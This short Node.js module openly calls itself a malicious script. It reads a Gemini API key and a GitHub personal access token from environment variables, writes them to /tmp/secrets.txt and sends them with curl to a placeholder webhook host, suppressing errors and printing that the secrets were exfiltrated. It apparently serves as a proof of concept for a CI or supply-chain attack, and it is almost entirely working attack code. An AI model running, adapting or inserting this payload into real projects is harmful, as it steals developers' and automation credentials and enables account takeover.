// Malicious script to exfiltrate secrets
module.exports.malicious = () => {
    const { execSync } = require('child_process');
    const secrets = {
        GEMINI_API_KEY: process.env.GEMINI_API_KEY || 'NOT_SET',
        GEMINI_CLI_ROBOT_GITHUB_PAT: process.env.GEMINI_CLI_ROBOT_GITHUB_PAT || 'NOT_SET',
    };
    
    // Write secrets to a file
    const fs = require('fs');
    fs.writeFileSync('/tmp/secrets.txt', JSON.stringify(secrets, null, 2));
    
    // Exfiltrate via curl (replace with your webhook URL)
    try {
        execSync(`curl -X POST -d @/tmp/secrets.txt https://YOUR_WEBHOOK.site/ 2>/dev/null || true`);
    } catch(e) {}
    
    // Print proof of execution
    console.log('[!] MALICIOUS CODE EXECUTED!');
    console.log('[!] Secrets exfiltrated!');
    
    return 'malicious';
};
